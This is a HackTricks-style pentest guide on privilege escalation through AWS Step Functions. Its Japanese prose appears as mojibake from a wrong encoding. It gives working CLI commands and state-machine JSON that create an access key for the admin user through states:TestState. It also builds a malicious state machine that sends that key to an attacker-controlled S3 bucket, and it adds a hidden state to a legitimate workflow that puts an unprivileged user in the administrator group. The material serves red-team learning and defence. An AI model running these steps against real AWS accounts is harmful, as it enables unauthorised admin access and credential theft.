# AWS - Step Functions Privesc

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## Step Functions

ã“ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã€ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-services/aws-stepfunctions-enum.md" %}
[aws-stepfunctions-enum.md](../aws-services/aws-stepfunctions-enum.md)
{% endcontent-ref %}

### ã‚¿ã‚¹ã‚¯ãƒªã‚½ãƒ¼ã‚¹

ã“ã‚Œã‚‰ã®ç‰¹æ¨©æ˜‡æ ¼æŠ€è¡“ã¯ã€å¸Œæœ›ã™ã‚‹ç‰¹æ¨©æ˜‡æ ¼ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ã„ãã¤ã‹ã®AWSã‚¹ãƒ†ãƒƒãƒ—ãƒ•ã‚¡ãƒ³ã‚¯ã‚·ãƒ§ãƒ³ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½¿ç”¨ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

å¯èƒ½ãªã™ã¹ã¦ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç¢ºèªã™ã‚‹ã«ã¯ã€è‡ªåˆ†ã®AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ç§»å‹•ã—ã€ä½¿ç”¨ã—ãŸã„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’é¸æŠã—ã¦ã€ãã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ç¢ºèªã§ãã¾ã™ã€‚ä¾‹ãˆã°ï¼š

<figure><img src="../../../.gitbook/assets/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

ã¾ãŸã¯ã€API AWSãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ç§»å‹•ã—ã¦ã€å„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ç¢ºèªã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š

* [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API\_AddUserToGroup.html)
* [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API\_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

**`states:TestState`**ãŠã‚ˆã³**`iam:PassRole`**ã®æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€æ—¢å­˜ã®ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã¾ãŸã¯æ›´æ–°ã™ã‚‹ã“ã¨ãªãã€ä»»æ„ã®ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ãƒ†ã‚¹ãƒˆã—ã€ä»»æ„ã®IAMãƒ­ãƒ¼ãƒ«ã‚’ãã‚Œã«æ¸¡ã™ã“ã¨ãŒã§ãã€ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’æŒã¤ä»–ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®æ¨©é™ãŒçµ„ã¿åˆã‚ã•ã‚‹ã“ã¨ã§ã€ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®æ“ä½œã‹ã‚‰ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ã€ãƒ‡ãƒ¼ã‚¿æ¼æ´©ã€ãƒªã‚½ãƒ¼ã‚¹ã®æ“ä½œã€ç‰¹æ¨©æ˜‡æ ¼ã«è‡³ã‚‹ã¾ã§ã€åºƒç¯„ãªä¸æ­£è¡Œç‚ºãŒå¼•ãèµ·ã“ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% code overflow="wrap" %}
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
{% endcode %}

ä»¥ä¸‹ã®ä¾‹ã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã¨AWSç’°å¢ƒã®è¨±å¯ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã—ã¦ã€**`admin`**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã™ã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆã‚’ãƒ†ã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®è¨±å¯ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã«ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãŒ**`iam:CreateAccessKey`**ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹é«˜æ¨©é™ãƒãƒªã‚·ãƒ¼ï¼ˆä¾‹ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess`**ï¼‰ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š

* **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
* **æ¨©é™æ˜‡æ ¼**ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚ŒãŸ**ã‚³ãƒãƒ³ãƒ‰**:

{% code overflow="wrap" %}
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
{% endcode %}

**æ½œåœ¨çš„ãªå½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ä¸æ­£ãªå®Ÿè¡Œã¨æ“ä½œã€ãŠã‚ˆã³æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

**`states:CreateStateMachine`** ã¨ **`iam:PassRole`** ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã—ã€ä»»æ„ã®IAMãƒ­ãƒ¼ãƒ«ã‚’æä¾›ã™ã‚‹ã“ã¨ãŒã§ãã€ãã®ãƒ­ãƒ¼ãƒ«ã®æ¨©é™ã‚’æŒã¤ä»–ã®AWSã‚µãƒ¼ãƒ“ã‚¹ã¸ã®ä¸æ­£ã‚¢ã‚¯ã‚»ã‚¹ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚å‰ã®ç‰¹æ¨©æ˜‡æ ¼æŠ€è¡“ (**`states:TestState`** & **`iam:PassRole`**) ã¨å¯¾ç…§çš„ã«ã€ã“ã‚Œã¯è‡ªå‹•çš„ã«ã¯å®Ÿè¡Œã•ã‚Œãšã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ä¸Šã§ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ãŸã‚ã« **`states:StartExecution`** ã¾ãŸã¯ **`states:StartSyncExecution`** ã®æ¨©é™ãŒå¿…è¦ã§ã™ (**`states:StartSyncExecution`** ã¯ **æ¨™æº–ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã«ã¯åˆ©ç”¨ã§ããšã€** è¡¨ç¾ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®ã¿ã«åˆ©ç”¨å¯èƒ½ã§ã™)ã€‚ 

{% code overflow="wrap" %}
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
{% endcode %}

ä»¥ä¸‹ã®ä¾‹ã¯ã€**`admin`** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’ä½œæˆã—ã€ã“ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚­ãƒ¼ã‚’æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹ S3 ãƒã‚±ãƒƒãƒˆã«æµå‡ºã•ã›ã‚‹ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆã™ã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€ã“ã‚Œã‚‰ã®æ¨©é™ã¨ AWS ç’°å¢ƒã®è¨±å¯ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ã“ã®è¨±å¯ã•ã‚ŒãŸãƒ­ãƒ¼ãƒ«ã«ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ãŒ **`iam:CreateAccessKey`** ãŠã‚ˆã³ **`s3:putObject`** ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹é«˜æ¨©é™ãƒãƒªã‚·ãƒ¼ï¼ˆä¾‹ãˆã° **`arn:aws:iam::aws:policy/AdministratorAccess`**ï¼‰ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

* **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
* **ã‚³ãƒãƒ³ãƒ‰** å®Ÿè¡Œã—ã¦ **ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’ä½œæˆ**:

{% code overflow="wrap" %}
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
{% endcode %}

* **ã‚³ãƒãƒ³ãƒ‰** ã¯ã€ä»¥å‰ã«ä½œæˆã—ãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã® **å®Ÿè¡Œã‚’é–‹å§‹** ã™ã‚‹ãŸã‚ã«å®Ÿè¡Œã•ã‚Œã¾ã—ãŸï¼š

{% code overflow="wrap" %}
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
{% endcode %}

{% hint style="warning" %}
æ”»æ’ƒè€…ãŒåˆ¶å¾¡ã™ã‚‹S3ãƒã‚±ãƒƒãƒˆã¯ã€è¢«å®³è€…ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã®s3:PutObjectã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å—ã‘å…¥ã‚Œã‚‹æ¨©é™ã‚’æŒã£ã¦ã„ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
{% endhint %}

**æ½œåœ¨çš„ãªå½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ä¸æ­£å®Ÿè¡Œã¨æ“ä½œã€æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### `states:UpdateStateMachine` & (å¿…ãšã—ã‚‚å¿…è¦ã§ã¯ãªã„) `iam:PassRole`

**`states:UpdateStateMachine`** æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã‚’å¤‰æ›´ã§ãã€ç‰¹æ¨©æ˜‡æ ¼ã«ã¤ãªãŒã‚‹è¿½åŠ ã®éš ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆã‚’è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®ã‚ˆã†ã«ã—ã¦ã€æ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ã¨ã€ã“ã®æ–°ã—ã„æ‚ªæ„ã®ã‚ã‚‹éš ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆãŒå®Ÿè¡Œã•ã‚Œã€ç‰¹æ¨©æ˜‡æ ¼ãŒæˆåŠŸã—ã¾ã™ã€‚

ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ãŒã©ã‚Œã ã‘è¨±å¯çš„ã§ã‚ã‚‹ã‹ã«ã‚ˆã£ã¦ã€æ”»æ’ƒè€…ã¯2ã¤ã®çŠ¶æ³ã«ç›´é¢ã—ã¾ã™ï¼š

1. **è¨±å¯çš„ãªIAMãƒ­ãƒ¼ãƒ«**: ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«é–¢é€£ä»˜ã‘ã‚‰ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ãŒã™ã§ã«è¨±å¯çš„ã§ã‚ã‚‹å ´åˆï¼ˆä¾‹ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess`** ãƒãƒªã‚·ãƒ¼ãŒæ·»ä»˜ã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ãŸã‚ã«**`iam:PassRole`** æ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“ã€‚ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã‚’æ›´æ–°ã™ã‚‹å¿…è¦ãŒãªã„ãŸã‚ã€ååˆ†ã§ã™ã€‚
2. **è¨±å¯çš„ã§ãªã„IAMãƒ­ãƒ¼ãƒ«**: å‰ã®ã‚±ãƒ¼ã‚¹ã¨ã¯å¯¾ç…§çš„ã«ã€ã“ã“ã§ã¯æ”»æ’ƒè€…ã¯**`iam:PassRole`** æ¨©é™ã‚‚å¿…è¦ã§ã™ã€‚ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®šç¾©ã‚’å¤‰æ›´ã™ã‚‹ã ã‘ã§ãªãã€ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«è¨±å¯çš„ãªIAMãƒ­ãƒ¼ãƒ«ã‚’é–¢é€£ä»˜ã‘ã‚‹å¿…è¦ãŒã‚ã‚‹ãŸã‚ã§ã™ã€‚

{% code overflow="wrap" %}
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
{% endcode %}

ä»¥ä¸‹ã®ä¾‹ã¯ã€HelloWorld Lambdaé–¢æ•°ã‚’å‘¼ã³å‡ºã™æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã‚’æ›´æ–°ã—ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼**`unprivilegedUser`**ã‚’**`administrator`** IAMã‚°ãƒ«ãƒ¼ãƒ—ã«è¿½åŠ ã™ã‚‹è¿½åŠ ã®ã‚¹ãƒ†ãƒ¼ãƒˆã‚’åŠ ãˆã‚‹æ–¹æ³•ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚ã“ã®ã‚ˆã†ã«ã—ã¦ã€æ­£å½“ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒæ›´æ–°ã•ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã®å®Ÿè¡Œã‚’é–‹å§‹ã™ã‚‹ã¨ã€ã“ã®æ–°ã—ã„æ‚ªæ„ã®ã‚ã‚‹ã‚¹ãƒ†ãƒ«ã‚¹ã‚¹ãƒ†ãƒ¼ãƒˆãŒå®Ÿè¡Œã•ã‚Œã€ç‰¹æ¨©æ˜‡æ ¼ãŒæˆåŠŸã—ã¾ã™ã€‚

{% hint style="warning" %}
ã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³ã«è¨±å¯ã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ãŒé–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ãªã„å ´åˆã€è¨±å¯ã•ã‚ŒãŸIAMãƒ­ãƒ¼ãƒ«ã‚’é–¢é€£ä»˜ã‘ã‚‹ãŸã‚ã«IAMãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã™ã‚‹ãŸã‚ã®**`iam:PassRole`**æ¨©é™ã‚‚å¿…è¦ã§ã™ï¼ˆä¾‹ãˆã°ã€**`arn:aws:iam::aws:policy/AdministratorAccess`**ãƒãƒªã‚·ãƒ¼ãŒæ·»ä»˜ã•ã‚ŒãŸã‚‚ã®ï¼‰ã€‚
{% endhint %}

{% tabs %}
{% tab title="æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}

{% tab title="æ‚ªæ„ã®ã‚ã‚‹æ›´æ–°ã•ã‚ŒãŸã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³" %}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{% endtab %}
{% endtabs %}

* **ã‚³ãƒãƒ³ãƒ‰** å®Ÿè¡Œã—ã¦ **æ­£å½“ãªã‚¹ãƒ†ãƒ¼ãƒˆãƒã‚·ãƒ³** ã‚’ **æ›´æ–°** ã™ã‚‹:

{% code overflow="wrap" %}
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
{% endcode %}

**æ½œåœ¨çš„å½±éŸ¿**: ãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã®ä¸æ­£å®Ÿè¡Œã¨æ“ä½œã€æ©Ÿå¯†ãƒªã‚½ãƒ¼ã‚¹ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒå¯èƒ½ã«ãªã‚Šã€é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¾µå®³ã«ã¤ãªãŒã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„!
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
